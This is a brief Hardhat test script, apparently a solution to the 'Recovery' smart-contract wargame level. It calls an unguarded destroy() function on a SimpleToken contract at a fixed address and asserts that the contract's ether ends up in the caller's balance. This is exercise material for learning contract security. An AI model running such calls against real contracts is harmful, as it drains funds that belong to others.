import { expect } from 'chai';
import { ethers } from 'hardhat';
import { Wallet } from 'ethers';

describe('Recovery', function () {
  let owner: Wallet;
  // let user: Wallet;
  it('attack', async function () {
    const tokenAddr = '0x744d71b19F31754CA37de70Ff4E8ff8136Aabe3B';

    [owner] = await (ethers as any).getSigners();
    const token = await ethers.getContractAt('SimpleToken', tokenAddr);

    const balance = await ethers.provider.getBalance(owner.address);
    await token.destroy(owner.address);

    expect(await ethers.provider.getBalance(owner.address)).to.be.gt(balance);
  });
});
